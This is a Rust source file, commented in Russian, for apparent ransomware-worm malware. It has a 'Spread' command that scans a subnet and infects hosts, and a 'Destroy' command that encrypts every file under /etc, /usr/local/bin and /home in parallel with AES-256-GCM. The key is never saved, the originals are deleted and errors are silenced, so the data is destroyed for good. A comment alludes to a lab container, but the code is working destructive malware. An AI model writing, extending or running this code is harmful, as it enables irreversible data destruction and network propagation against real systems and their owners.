use aes_gcm::{
    aead::{Aead, AeadCore, KeyInit, OsRng},
    Aes256Gcm,
};
use clap::{Parser, Subcommand};
use log::{error, info, warn};
use rayon::prelude::*; // Параллелизм
use std::fs::{self, File};
use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use std::time::Instant;
use walkdir::WalkDir;

mod worm;

#[derive(Parser)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    Spread {
        #[arg(short, long)]
        subnet: String,
    },
    /// Уничтожение системы (параллельное шифрование)
    Destroy,
    /// Тест на папке
    Attack {
        #[arg(short, long)]
        target: String,
    },
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    env_logger::Builder::from_env(env_logger::Env::default().default_filter_or("info")).init();
    let cli = Cli::parse();

    match cli.command {
        Commands::Spread { subnet } => {
            worm::scan_and_infect(&subnet)?;
        },
        Commands::Destroy => {
            // Атака на системные директории
            // В контейнере это приведет к краху команд ls, cat и т.д.
            let targets = vec!["/tmp/devos-lab", "/etc", "/usr/local/bin", "/home"];
            system_destroy(targets).await?;
        },
        Commands::Attack { target } => {
            attack_directory(&target).await?;
        }
    }
    Ok(())
}

async fn system_destroy(targets: Vec<&str>) -> anyhow::Result<()> {
    info!("💀 MODE: SYSTEM DESTROYER. PARALLEL ENCRYPTION STARTED.");
    let key = Aes256Gcm::generate_key(&mut OsRng);
    // Клонируем ключ для потоков
    let key_bytes = key.clone(); 

    let start = Instant::now();

    // Собираем все файлы в один список
    let mut all_files = Vec::new();
    for target in targets {
        info!("Targeting: {}", target);
        for entry in WalkDir::new(target).into_iter().filter_map(|e| e.ok()) {
            let path = entry.path().to_path_buf();
            // Не шифруем системные критические файлы (proc, sys, dev) и сам бинарник
            if path.is_file() && !path.to_string_lossy().contains("d-ransom") {
                all_files.push(path);
            }
        }
    }

    info!("Found {} files to encrypt.", all_files.len());

    // Параллельное уничтожение (использует все ядра)
    all_files.par_iter().for_each(|path| {
        let cipher = Aes256Gcm::new(&key_bytes);
        if let Err(_) = encrypt_file(path, &cipher) {
            // Тишина в эфире при ошибках, важна скорость
        }
    });

    warn!("💀 SYSTEM PARALYZED in {:.2?}", start.elapsed());
    Ok(())
}

// ... функция attack_directory (однопоточная) остается для тестов ...
async fn attack_directory(target: &str) -> anyhow::Result<()> {
    // ... старый код ...
    Ok(())
}

fn encrypt_file(path: &Path, cipher: &Aes256Gcm) -> anyhow::Result<()> {
    // Проверка на расширение, чтобы не шифровать дважды
    if path.extension().and_then(|s| s.to_str()) == Some("locked") { return Ok(()); }

    let mut file = File::open(path)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;

    let nonce = Aes256Gcm::generate_nonce(&mut OsRng);
    let ciphertext = cipher.encrypt(&nonce, buffer.as_ref())
        .map_err(|e| anyhow::anyhow!(e))?;

    let new_path = path.with_extension("locked");
    let mut outfile = File::create(&new_path)?;
    outfile.write_all(&nonce)?;
    outfile.write_all(&ciphertext)?;

    fs::remove_file(path)?;
    Ok(())
}